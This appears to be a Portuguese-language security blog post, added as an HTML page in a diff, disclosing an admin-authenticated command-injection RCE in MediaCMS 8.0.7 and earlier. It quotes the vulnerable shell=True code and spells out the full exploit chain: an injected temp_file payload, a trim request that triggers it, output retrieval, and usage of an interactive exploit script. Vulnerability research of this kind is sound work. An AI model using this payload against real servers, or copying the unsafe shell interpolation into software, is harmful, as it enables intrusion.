@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Unfair?</title>
+    <style>
+    :root {
+      --bg: #000000;
+      --panel: rgba(255, 255, 255, 0.03);
+      --border: rgba(255, 255, 255, 0.06);
+      --text: #cfd6ff;
+      --muted: #7d85a6;
+      --accent: #5b7cfa;
+    }
+
+    body {
+      margin: 60px auto;
+      width: 75%;
+      background: radial-gradient(circle at 20% 10%, #000000, var(--bg));
+      color: var(--text);
+      font-family: 'IBM Plex Mono', monospace;
+      font-size: 14px;
+    }
+
+    #h1 {
+      font-size: 22px;
+      margin-top: 0;
+    }
+
+    #asci {
+      font-size: 3px;
+      line-height: 1;
+      /* Mantém o espaçamento vertical correto */
+      margin: 0;
+    }
+
+    pre {
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+
+    b {
+      color: #995c5c;
+    }
+
+    section {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 24px;
+      margin-top: 32px;
+    }
+
+#cwes {
+  border-radius: 10px;
+  padding: 30px;
+  margin-top: 32px;
+  max-width: 650px;
+  margin-left: auto;
+  margin-right: auto;
+  display: flex;
+  justify-content: center;
+}
+
+#cwes .img-wrapper {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+#cwes .img-wrapper img {
+  width: 280px;
+  height: auto;
+  display: block;
+  animation: pulse 3s infinite ease-in-out;
+}
+
+@keyframes pulse {
+  0% {
+    transform: scale(1);
+    filter: drop-shadow(0 0 20px rgba(15, 28, 78, 0.6))
+            drop-shadow(0 0 40px rgba(15, 28, 78, 0.6));
+  }
+  50% {
+    transform: scale(1.08);
+    filter: drop-shadow(0 0 30px rgba(15, 28, 78, 0.6))
+            drop-shadow(0 0 60px rgba(15, 28, 78, 0.6));
+  }
+  100% {
+    transform: scale(1);
+    filter: drop-shadow(0 0 20px rgba(15, 28, 78, 0.6))
+            drop-shadow(0 0 40px rgba(15, 28, 78, 0.6));
+  }
+}
+    </style>
+</head>
+<body>
+                  <center>
+                    <pre id="asci">
+        ⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⠀⠀
+    ⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀
+    ⢀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⡀
+    ⠘⡀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⢀⠇
+    ⠀⣧⠀⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡇⠀⣼⠀
+    ⠀⢸⣆⠀⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠀⣰⡏⠀
+    ⢱⡀⢿⣆⠸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡏⣰⡿⠀⡌
+    ⠀⢷⡈⢿⣧⣻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣟⣴⡿⢁⡾⠀
+    ⢀⠈⢷⣌⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⡿⣡⡾⠁⡀
+    ⠀⠳⡈⢻⣦⡻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣵⡟⢁⠞⠀
+    ⠀⠀⠙⢦⡹⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⢏⣴⠋⠀⠀
+    ⠀⠀⠀⡈⠻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠟⢁⠀⠀⠀
+    ⠀⠀⠀⠈⠢⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⠔⠁⠀⠀⠀
+    ⠀⠀⠀⠀⢀⠈⠛⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠛⠁⡀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠉⠒⠦⣬⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣥⠴⠒⠉⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠠⠤⢤⣌⣉⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣉⣡⡤⠤⠄⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣉⣭⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣯⣭⣭⣉⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⢉⣉⣭⣽⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣭⣉⣉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠛⠛⠛⠛⢛⣩⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣭⡛⠛⠛⠛⠛⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠴⠾⠟⠛⣫⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣝⠛⠻⠷⠦⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠟⠛⣫⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣝⠛⠻⠶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠾⠛⣡⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⢿⣎⠛⠷⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠋⢀⠿⠋⡿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⠙⠿⡄⠙⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⠇⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+      </pre>
+                </center>
+    <section>
+        <br>
+    <p>Hello everyone,</p>
+    <p>Em maio de 2026, encontrei uma vulnerabilidade de Remote Code Execution (RCE) em um CMS com mais de 4.9k estrelas no GitHub, afetando versões iguais ou inferiores à 8.0.7.</p>
+    <p>O que deixa esse caso interessante é o que aconteceu no processo de divulgação: quando notifiquei o mantenedor, ele respondeu que não perderia tempo analisando o problema mesmo apresentando para ele uma POC 100% funcional e evidências claras da vulnerabilidade em tempo real. Mesmo assim, dois dias depois, uma atualização foi publicada corrigindo exatamente a falha, algo que em condições normais, teria gerado um CVE.</p>
+    <p>Neste artigo, apresento uma análise técnica da vulnerabilidade, abordando seu funcionamento e o processo de exploração.</p>
+    <br>
+    <h3>About MediaCMS</h3>
+    <p>O MediaCMS é um sistema de gerenciamento de conteúdo de vídeo e mídia moderno e completo, de código aberto. Foi desenvolvido para atender às necessidades das plataformas web atuais no que diz respeito à exibição e compartilhamento de mídias. É possível utilizar o MediaCMS para criar, em poucos minutos, um portal de vídeo e mídia, seja de pequeno ou médio porte.</p>
+    <p>Foi desenvolvido utilizando principalmente as tecnologias modernas Django + React. Além disso, conta com uma API REST.</p>
+    <br>
+    <h3>Exploration Vector</h3>
+    <p>O MediaCMS possui uma vulnerabilidade de injeção de comando do sistema operacional na função <b>kill_ffmpeg_process</b> ( <strong>files/methods.py</strong> ).</p>
+    <p>Essa função constrói um comando de shell, interpolando diretamente o caminho do arquivo, utilizando o operador de formatação de strings do Python <b>%</b>. Em seguida, a string resultante é passada para a função <b>subprocess.run(..., shell=True)</b> , sem qualquer tipo de verificação ou tratamento adequado.</p>
+
+    <p>Um invasor com credenciais de administrador pode inserir uma string arbitrária no campo <b>temp_file</b> de um objeto <b>Encoding</b>, por meio do endpoint da API <b>EncodingDetail</b>.
+     Esse valor é, posteriormente, transmitido intacto como argumento <b>filepath</b> para a função <b>kill_ffmpeg_process</b>.    
+    </p>
+    <p>Essa função executa o comando inserido dentro de um shell. Os metacaracteres do shell, como o ponto e vírgula ( <b>;</b> ), permitem a inserção de comandos do sistema operacional, que são executados no contexto do usuário do processo Celery ( <b>www-data</b> ).</p>
+    <br>
+    <h3>Root Cause</h3>
+    <p>A função <b>kill_ffmpeg_process</b> foi desenvolvida para localizar e eliminar processos <b>ffmpeg</b> ativos, através da busca realizada por meio de <b>ps aux</b> e <b>grep</b> . O caminho do arquivo especificado em <b>grep</b> é controlado pelo usuário (armazenado por meio da API de administração). Esse caminho é inserido diretamente na string de comando do shell. O uso de <b>subprocess.run(..., shell=True)</b> com uma string de entrada não validada é a causa principal do problema.</p>
+    <br>
+    <h3>Affected Code</h3>
+    <h4>Sink — files/methods.py (~line 447)</h4>
+    <b><pre><code>def kill_ffmpeg_process(filepath):
+    cmd = "ps aux|grep 'ffmpeg'|grep %s|grep -v grep |awk '{print $2}'" % filepath
+    result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
+    pid = result.stdout.decode("utf-8").strip()
+    if pid:
+        cmd = "kill -9 %s" % pid
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
+    </code></pre></b>
+    <p>O parâmetro filepath, controlado pelo usuário, é interpolado diretamente em uma string de comando shell sem qualquer sanitização, e executado via <b>subprocess.run()</b> com <b>shell=True</b> o que permite que um atacante injete comandos arbitrários no sistema.</p>
+    <br>
+    <h4>Source — files/views/encoding.py (~line 138)</h4>
+    <b><pre><code>if temp_file:
+        encoding.temp_file = temp_file  # user-controlled, no sanitization
+        to_update.append("temp_file")
+    </code></pre></b>
+    <p>O parâmetro <b>temp_file</b>, controlado pelo usuário, é atribuído diretamente ao objeto <b>encoding.temp_file</b> sem qualquer validação ou sanitização, permitindo que um atacante manipule o caminho do arquivo temporário utilizado no processo de encoding.</p>
+    <br>
+    <h4>Trigger — files/tasks.py (~line 88, called from video_trim_task)</h4>
+    <b><pre><code>def handle_pending_running_encodings(media):
+    encodings = media.encodings.exclude(status="success")
+    for encoding in encodings:
+        if encoding.temp_file:
+            kill_ffmpeg_process(encoding.temp_file)  # << a injeção ocorre aqui
+
+    </code></pre></b>
+
+    <p>A função <b>handle_pending_running_encodings</b> itera sobre os encodings de uma mídia e, para cada um que possua <b>temp_file</b> definido, chama diretamente <b>kill_ffmpeg_process</b> com o valor armazenado que, como visto anteriormente, é controlado pelo usuário e não sanitizado. É aqui que a injeção de comandos é efetivamente disparada.</p>
+    <br>
+    <h3>Proof of concept</h3>
+    <p>Para demonstrar a vulnerabilidade foi construido um payload onde executa o comando <b>id</b> e redireciona para um arquivo:</p>
+    <b><pre><code>action=update_fields&status=pending&temp_file=/tmp/a;$(id>/home/mediacms.io/mediacms/media_files/original/thumbnails/user/admin/poc.jpg);echo</code></pre></b>
+    <p>O payload aproveita o parâmetro <b>temp_file</b> para injetar um comando via substituição de processo <b>$()</b>. O <b>;</b> encerra o caminho legítimo, <b>id</b> é executado e sua saída é redirecionada para um arquivo <b>.jpg</b>, o echo no final evita erros de sintaxe no shell.</p>
+    <img src="/SRC/cms/comando.png" alt="" width="95%">
+    <h4>Response:</h4>
+    <b><pre><code>{"status": "success"}</code></pre></b>
+    <p>O paylaod é armazenado em <b>encoding.temp_file</b> no banco de dados.</p>
+    <h4>Notes on output path selection:</h4>
+    <p><b>nginx</b> serve arquivos localizados em <b>media_files/original/thumbnails/</b> sem restrições quanto às extensões dos arquivos.</p>
+    <p>Os arquivos do tipo <b>Dotfiles (por exemplo, .rce.txt)</b> são bloqueados pelo nginx <b>(location ~ /\. { deny all; })</b>.</p>
+    <p>Os subdiretórios criados dinamicamente retornam o código 404, pois o diretório não existe no container do Celery no momento da execução.</p>
+    <p><b>thumbnails/user/username/</b> já existe e pode ser modificado por <b>www-data</b>.</p>
+
+    <h4>Trigger Execution via trim_video</h4>
+    <p>A tarefa <b>video_trim_task</b> do Celery chama a função <b>handle_pending_running_encodings</b> , que itera por todas as codificações que não foram bem-sucedidas e passa o resultado para <b>kill_ffmpeg_process</b>.</p>
+    <p>Payload: </p>
+    <b><pre><code>{"segments": [{"startTime": "00:00:00.000", "endTime": "00:01:00.000"}]}</code></pre></b>
+    <img src="/SRC/cms/trim.png" alt="" width="95%">
+    <p>Ao usar <b>startTime=00:00:00.000</b> , <b>get_trim_timestamps</b> é executado imediatamente, sem que <b>ffprobe</b> seja executado. Dessa forma, a tarefa é realizada, independentemente do tipo de mídia utilizada.</p>
+
+    <h4>Response:</h4>
+    <b><pre><code>{"success": true, "request_id":75}</code></pre></b>
+
+    <h4>Confirm RCE</h4>
+    <p>Aguarde cerca de 4 segundos para que o Celery processe a tarefa. Em seguida, visite o arquivo criado na web.</p>
+    <b><pre><code>GET /media/original/thumbnails/user/admin/poc.jpg HTTP/1.1</code></pre></b>
+    <img src="/SRC/cms/poc.png" alt="" width="70%">
+    <p>Dessa forma, um usuário administrador consegue obter execução remota de código no servidor.</p>
+    <br>
+    <h3>Exploit</h3>
+    <p>Com base na análise da vulnerabilidade, foi desenvolvida uma prova de conceito automatizada em Python, que abrange todo o fluxo de exploração manual, desde a autenticação até a injeção do payload.
+        O exploit contem duas funcionalidades importantes sendo elas <b>--command</b> e a <b>--interactive</b>.
+    </p>
+    <p>O exploit estará disponível no meu github <b><a href="https://github.com/kernelzada/MediaCMS-8.0.7-Admin-Authenticated-RCE">neste link</a></b>.</p>
+    <br>
+    <b><pre><code>python3 exploit.py -u admin -p Senha@123 --command "id"</code></pre></b>
+    <img src="/SRC/cms/id.png" alt="" width="35%">
+    <br>
+    <br>
+    <br>
+    <b><pre><code>python3 exploit.py -u admin -p Senha@123 --interactive</code></pre></b>
+    <img src="/SRC/cms/intera.png" alt="" width="40%">
+    <br>
+    <h3>"O orgulhoso prefere perder-se a perguntar qual é o seu caminho." <span style="font-size: 0.8em;">Winston Churchill.</span></h3>
+
+    <center><p><br>
+        by Leonardo Kauan - krnl</p></center>
+
+    </section>
